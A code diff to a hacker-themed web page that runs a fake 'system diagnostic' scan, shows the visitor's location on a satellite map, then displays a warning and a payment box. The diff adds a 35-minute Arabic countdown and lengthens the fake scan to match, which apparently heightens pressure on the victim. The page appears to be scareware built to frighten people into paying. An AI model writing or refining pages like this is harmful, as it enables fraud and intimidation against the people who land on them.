@@ -13,8 +13,8 @@
         .typing { overflow: hidden; white-space: nowrap; margin: 10px 0; font-size: 18px; border-left: 2px solid #00ff00; }
         .data-line { margin: 10px 0; font-size: 16px; border-bottom: 1px solid #003300; padding-bottom: 5px; }
         #map-box { display: none; margin-top: 15px; border: 1px solid #ff0000; height: 250px; width: 100%; filter: sepia(100%) hue-rotate(90deg) saturate(150%); }
+        .timer-display { color: #ff0000; text-align: center; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
         
-        /* التحذيرات والرسائل */
         #warning-trigger { display: none; background: #4a0000; border: 1px solid #ff0000; color: #fff; padding: 15px; margin-top: 15px; text-align: center; cursor: pointer; animation: pulse 1s infinite; font-weight: bold; }
         #details-box { display: none; background: #000; border: 2px solid #ff0000; padding: 20px; margin-top: 15px; text-align: center; color: #ff0000; }
         #payment-box { display: none; background: #1a1a00; border: 3px double #ffff00; padding: 20px; margin-top: 15px; text-align: center; color: #fff; }
@@ -33,6 +33,8 @@
         <div class="console">
             <div id="logs" class="log-stream"></div>
             <h3 style="text-align:center; color:#00ff00; letter-spacing: 2px;">[SYSTEM_DIAGNOSTIC_v4.0]</h3>
+            
+            <div class="timer-display">تحليل النظام نشط.. الوقت المتبقي: <span id="clock">35:00</span></div>
             
             <div id="step1" class="typing">INITIALIZING SCAN...</div>
             
@@ -80,16 +82,21 @@
         }
         setInterval(drawMatrix, 50);
 
-        // Side Logs
-        setInterval(() => {
-            const p = document.createElement('div');
-            p.innerText = "LINKING.." + Math.random().toString(16).slice(2,6).toUpperCase();
-            document.getElementById('logs').prepend(p);
-            if(document.getElementById('logs').children.length > 8) document.getElementById('logs').lastChild.remove();
-        }, 800);
+        // Timer Logic (35 Minutes)
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            let clockInt = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                document.getElementById('clock').textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+                if (--timer < 0) clearInterval(clockInt);
+            }, 1000);
+        }
 
-        // Logic
         window.onload = () => {
+            startTimer(2100); // 35 دقيقة بالثواني
+            
+            // العملية تنتهي بعد 35 دقيقة بالضبط
             setTimeout(() => {
                 document.getElementById('step1').style.display = "none";
                 document.getElementById('results').style.display = "block";
@@ -97,7 +104,7 @@
                 document.getElementById('gMap').src = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2siq!4v123&layer=s`;
                 document.getElementById('map-box').style.display = "block";
                 setTimeout(() => { document.getElementById('warning-trigger').style.display = "block"; }, 2000);
-            }, 3000); // الوقت الحالي سريع للفحص (3 ثواني)
+            }, 2100000); 
         };
 
         function showDetails() {
@@ -110,6 +117,13 @@
             document.getElementById('map-box').style.display = "none";
             document.getElementById('payment-box').style.display = "block";
         }
+
+        setInterval(() => {
+            const p = document.createElement('div');
+            p.innerText = "LINKING.." + Math.random().toString(16).slice(2,6).toUpperCase();
+            document.getElementById('logs').prepend(p);
+            if(document.getElementById('logs').children.length > 8) document.getElementById('logs').lastChild.remove();
+        }, 800);
     </script>
 </body>
 </html>
